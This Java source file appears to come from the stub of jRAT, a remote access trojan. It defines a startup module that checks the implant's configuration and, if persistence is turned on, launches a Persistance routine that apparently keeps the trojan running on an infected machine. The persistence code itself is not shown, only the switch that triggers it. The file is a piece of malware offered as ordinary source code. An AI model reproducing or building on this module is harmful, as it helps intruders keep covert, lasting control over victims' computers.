package io.jrat.stub.modules.startup;

import io.jrat.stub.Configuration;
import io.jrat.stub.Persistance;
import java.util.Map;

public class PersistanceStartupModule extends StartupModule {
	
	public PersistanceStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		if (Boolean.parseBoolean(Configuration.getConfig().get("per"))) {
			new Persistance(Integer.parseInt(Configuration.getConfig().get("perms"))).start();
		}
	}

}
